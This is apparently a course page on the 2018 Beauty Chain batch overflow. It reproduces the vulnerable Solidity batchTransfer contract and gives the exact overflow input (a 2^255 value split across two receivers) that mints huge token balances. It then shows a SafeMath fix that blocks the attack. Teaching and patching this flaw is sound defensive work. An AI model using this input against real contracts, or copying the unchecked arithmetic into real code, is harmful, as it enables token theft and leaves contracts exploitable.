<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Test locally the Attack</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Test locally the Attack</h1><br/><br /><strong>Vulnerable code exploited during Beauty Chain Batch Overflow 2018</strong><br />The code from Beauty Chain is been little bit updated, to meet the current compiler standards with a few small tweaks and some functions so you can check your balance during the stages of the attack.<br />Original vulnerable code: <a href="https://etherscan.io/address/0xc5d105e63711398af9bbff092d4b6769c82f793d#code">https://etherscan.io/address/0xc5d105e63711398af9bbff092d4b6769c82f793d#code</a><br />Vulnerable Code updated by @Ficti0n to Solidity 0.6.6: <a href="https://github.com/cclabsInc/BlockChainExploitation/tree/master/2020_BlockchainFreeCourse/integerAttacks">https://github.com/cclabsInc/BlockChainExploitation/tree/master/2020_BlockchainFreeCourse/integerAttacks</a><br /><div class="codebox"><pre>pragma solidity 0.6.6; <br /><br />contract BEC_Vuln {<br />    mapping (address=&gt;uint) balances;<br />    <br /><br />    function batchTransfer(address[] memory _receivers, uint256 _value) <span style="color:#ff9d00;font-weight:700">public</span> payable returns (<span style="color:#7f0044;font-weight:400">bool</span>) {<br />        uint cnt = _receivers.length;<br />        uint256 amount = uint256(cnt) * _value;<br />        require(cnt &gt; <span style="color:#ff0044;font-weight:400">0</span> &amp;&amp; cnt &lt;= <span style="color:#ff0044;font-weight:400">20</span>);<br />        require(_value &gt; <span style="color:#ff0044;font-weight:400">0</span> &amp;&amp; balances[msg.sender] &gt;= amount);<br />    <br />        balances[msg.sender] = balances[msg.sender] - amount;<br />        <span style="color:#ff9d00;font-weight:700">for</span> (uint i = <span style="color:#ff0044;font-weight:400">0</span>; i &lt; cnt; i++) {<br />            balances[_receivers[i]] = balances[_receivers[i]] + _value;<br />            <span style="color:#0088ff;font-weight:400">//transfer(msg.sender, _receivers[i], _value);</span><br />        }<br />        <span style="color:#ff9d00;font-weight:700">return</span> <span style="color:#ff9d00;font-weight:700">true</span>;<br />     }<br />     <br />        function deposit() <span style="color:#ff9d00;font-weight:700">public</span> payable{<br />            balances[msg.sender] = msg.value;<br />    }<br /><br />        function getBalance() <span style="color:#ff9d00;font-weight:700">public</span> view returns (uint){<br />            <span style="color:#ff9d00;font-weight:700">return</span> balances[msg.sender];<br />    }<br />}</pre></div><br /><br /><strong><span style="color:#ff0000;">Attack input </span></strong><br />For test purpose we can use <a href="http://remix.ethereum.org/">http://remix.ethereum.org/</a><br />   ◇ address[] memory _receivers → [&quot;0x78731D3Ca6b7E34aC0F824c42a7cC18A495cabaB&quot;,&quot;0x617F2E2fD72FD9D5503197092aC168c91465E7f2&quot;]<br />   ◇ uint256 _value →<br />      ▪  hexadecimal → 0x8000000000000000000000000000000000000000000000000000000000000000<br />        <div class="codebox"><pre>[<span style="color:#3ad900;font-weight:400">&quot;0x78731D3Ca6b7E34aC0F824c42a7cC18A495cabaB&quot;</span>,<span style="color:#3ad900;font-weight:400">&quot;0x617F2E2fD72FD9D5503197092aC168c91465E7f2&quot;</span>],<span style="color:#ff0044;font-weight:400">0x8000000000000000000000000000000000000000000000000000000000000000</span></pre></div><br />      ▪ decimal → 57896044618658097711785492504343953926634992332820282019728792003956564819968<br />        <div class="codebox"><pre>[<span style="color:#3ad900;font-weight:400">&quot;0x78731D3Ca6b7E34aC0F824c42a7cC18A495cabaB&quot;</span>,<span style="color:#3ad900;font-weight:400">&quot;0x617F2E2fD72FD9D5503197092aC168c91465E7f2&quot;</span>],<span style="color:#ff0044;font-weight:400">57896044618658097711785492504343953926634992332820282019728792003956564819968</span></pre></div><br />          <a href=""><img src="images/1412-1.png" alt="images/1412-1.png" /></a><br />After the attack to the balance of the two receivers address will be added 57896044618658097711785492504343953926634992332820282019728792003956564819968 tokens, while the balance of the sender will remain unchanged<br /><br /><strong><h3>Fixing the erc20 overflow vulnerability</h3></strong><br /><strong>IMPORTANT</strong>: <a href="https://soliditydeveloper.com/solidity-0.8#:~:text=Integrated%20SafeMath">from solidity 0.8 the SafeMath library is integrated in mathematical operations</a><br />As always in application security, we should use opensource well vetted security libraries for coding projects. Ethereum is no exception to this rule and has its own opensource libraries from OpenZeppelin which handle anything from safe mathematical calculations to role based authentication. <br />This is the math library:<br />    <a href="https://github.com/ConsenSysMesh/openzeppelin-solidity/blob/master/contracts/math/SafeMath.sol">https://github.com/ConsenSysMesh/openzeppelin-solidity/blob/master/contracts/math/SafeMath.sol</a><br />This is how import into our code under the pragma solidity definition:<br />    <div class="codebox"><pre>pragma solidity 0.6.6;<br />import <span style="color:#3ad900;font-weight:400">&quot;https://github.com/ConsenSysMesh/openzeppelin-solidity/blob/master/contracts/math/SafeMath.sol&quot;</span>;</pre></div><br />With the SafeMath library we can use for example these math functions:<br />   ◇ multiply → SafeMath.mul(value1, value2)<br />   ◇ division → SafeMath.div(value1, value2)<br />   ◇ subtraction → SafeMath.sub(value1, value2)<br />   ◇ addition → SafeMath.add(value1, value2)<br /><br /><div class="codebox"><pre>pragma solidity 0.6.6;<br />import <span style="color:#3ad900;font-weight:400">&quot;https://github.com/ConsenSysMesh/openzeppelin-solidity/blob/master/contracts/math/SafeMath.sol&quot;</span>;<br /><br />contract BEC_Vuln {<br />    mapping (address=&gt;uint) balances;<br />    <br /><br />    function batchTransfer(address[] memory _receivers, uint256 _value) <span style="color:#ff9d00;font-weight:700">public</span> payable returns (<span style="color:#7f0044;font-weight:400">bool</span>) {<br />        uint cnt = _receivers.length;<br />        uint256 amount = SafeMath.mul(uint256(cnt), _value);   <span style="color:#0088ff;font-weight:400">//&lt;---changed</span><br />        require(cnt &gt; <span style="color:#ff0044;font-weight:400">0</span> &amp;&amp; cnt &lt;= <span style="color:#ff0044;font-weight:400">20</span>);<br />        require(_value &gt; <span style="color:#ff0044;font-weight:400">0</span> &amp;&amp; balances[msg.sender] &gt;= amount);<br />    <br />        balances[msg.sender] = SafeMath.sub(balances[msg.sender],  amount);   <span style="color:#0088ff;font-weight:400">//&lt;--- changed</span><br />        <span style="color:#ff9d00;font-weight:700">for</span> (uint i = <span style="color:#ff0044;font-weight:400">0</span>; i &lt; cnt; i++) {<br />            balances[_receivers[i]] = SafeMath.add(balances[_receivers[i]],  _value);   <span style="color:#0088ff;font-weight:400">//&lt;--- changed</span><br />            <span style="color:#0088ff;font-weight:400">//transfer(msg.sender, _receivers[i], _value);</span><br />        }<br />        <span style="color:#ff9d00;font-weight:700">return</span> <span style="color:#ff9d00;font-weight:700">true</span>;<br />     }<br />     <br />        function deposit() <span style="color:#ff9d00;font-weight:700">public</span> payable{<br />            balances[msg.sender] = msg.value;<br />    }<br /><br />        function getBalance() <span style="color:#ff9d00;font-weight:700">public</span> view returns (uint){<br />            <span style="color:#ff9d00;font-weight:700">return</span> balances[msg.sender];<br />    }<br />}</pre></div><br /><br />Input data for the BatchTransfer function<br /><div class="codebox"><pre>[<span style="color:#3ad900;font-weight:400">&quot;0xdD870fA1b7C4700F2BD7f44238821C26f7392148&quot;</span>,<span style="color:#3ad900;font-weight:400">&quot;0x583031D1113aD414F02576BD6afaBfb302140225&quot;</span>],<span style="color:#ff0044;font-weight:400">0x8000000000000000000000000000000000000000000000000000000000000000</span></pre></div><br /><br />How we can see the attack will not work anymore<br /><a href=""><img src="images/1412-2.png" alt="images/1412-2.png" /></a><br /></div>
</body>
</html>
